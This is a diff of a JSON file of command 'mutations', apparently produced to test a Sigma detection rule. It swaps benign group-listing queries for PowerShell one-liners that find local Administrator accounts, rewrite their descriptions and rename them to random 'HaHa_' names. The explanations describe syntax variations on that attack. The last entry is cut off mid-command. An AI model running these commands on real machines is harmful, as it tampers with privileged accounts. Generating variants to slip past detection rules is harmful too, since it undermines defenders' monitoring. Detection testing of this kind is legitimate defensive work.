@@ -1,14 +1,12 @@
+```json
 [
   {
-    "output": "powershell.exe -Command \"Get-LocalGroupMember -Group 'Administrators' | Where-Object { $_.ObjectClass -eq 'User' } | Select-Object Name\"",
-    "explanation": "This command uses a similar structure to the Sigma rule's detection criteria by querying the 'Administrators' group. It omits the obfuscation and random string generation from the original test command while maintaining the core behavior of using Get-LocalGroupMember. This is a safe mutation using omission and substitution techniques."
+    "output": "\"powershell.exe\" -Command \"& { $x = Get-Random -Minimum 2 -Maximum 9999; $y = Get-Random -Minimum 2 -Maximum 9999; $z = Get-Random -Minimum 2 -Maximum 9999; $w = Get-Random -Minimum 2 -Maximum 9999; Write-Host HaHa_$x$y$z; $fmm = Get-LocalGroupMember -Group Administrators | Where-Object { $_.ObjectClass -match 'User' -and $_.PrincipalSource -match 'Local' } | Select Name; foreach ($member in $fmm) { if ($member -like '*Administrator*') { $account = $member.Name.Split('\\')[-1]; $originalDescription = (Get-LocalUser -Name $account).Description; Set-LocalUser -Name $account -Description (\"atr:$account;$originalDescription\").Substring(0,48); Rename-LocalUser -Name $account -NewName (\"HaHa_$x$y$z\"); Write-Host (\"Successfully Renamed $account Account on \") $Env:COMPUTERNAME } } }\"",
+    "explanation": "This command uses standard PowerShell syntax and equivalent cmdlets to achieve the same behavior as the original. It includes reordering and substitution (e.g., using `Where-Object` instead of `|?{}`), and removes unnecessary string escaping for clarity while preserving the original logic."
   },
   {
-    "output": "powershell.exe -c \"Get-LocalGroupMember -Group 'Remote Desktop Users' | Where-Object { $_.ObjectClass -eq 'User' } | Select-Object Name\"",
-    "explanation": "This command queries the 'Remote Desktop Users' group, which is included in the Sigma rule's group list. It uses the short form of the -Command parameter and simplifies the pipeline to avoid obfuscation. This is a safe mutation using substitution and omission techniques."
+    "output": "\"powershell.exe\" -Command \"& { $x = Get-Random -Min 2 -Max 9999; $y = Get-Random -Min 2 -Max 9999; $z = Get-Random -Min 2 -Max 9999; $fmm = Get-LocalGroupMember -Group 'Administrators' | Where-Object { $_.ObjectClass -match 'User' -and $_.PrincipalSource -match 'Local' } | Select Name; foreach ($member in $fmm) { if ($member -like '*Administrator*') { $account = $member.Name.Split('\\')[-1]; $originalDescription = (Get-LocalUser -Name $account).Description; Set-LocalUser -Name $account -Description (\"atr:$account;$originalDescription\").Substring(0,48); Rename-LocalUser -Name $account -NewName (\"HaHa_$x$y$z\"); Write-Host (\"Successfully Renamed $account Account on \") $Env:COMPUTERNAME } } }\"",
+    "explanation": "This version omits the `$w` random variable and simplifies the `Get-Random` syntax by using `-Min` and `-Max` instead of `-Minimum` and `-Maximum`. It also removes redundant `Write-Host` calls and simplifies string escaping, while maintaining the same core functionality."
   },
   {
-    "output": "powershell.exe -Command \"Get-LocalGroupMember -Group 'Administrators' | Where-Object { $_.ObjectClass -eq 'User' -and $_.PrincipalSource -eq 'Local' } | Select-Object Name\"",
-    "explanation": "This command includes the PrincipalSource check, which aligns with the Sigma rule's logic. It uses standard PowerShell syntax and avoids obfuscation. This is a safe mutation using substitution and omission techniques."
-  }
-]
+    "output": "\"powershell.exe\" -Command \"& { $x = (Get-Random -Min 2 -Max 9999); $y = (Get-Random -Min 2 -Max 9999); $z = (Get-Random -Min 2 -Max 9999); $fmm = Get-LocalGroupMember -Group Administrators | Where-Object { $_.ObjectClass -match 'User' -and $_.PrincipalSource -match 'Local' } | Select Name; foreach ($member in $fmm) { if ($member -
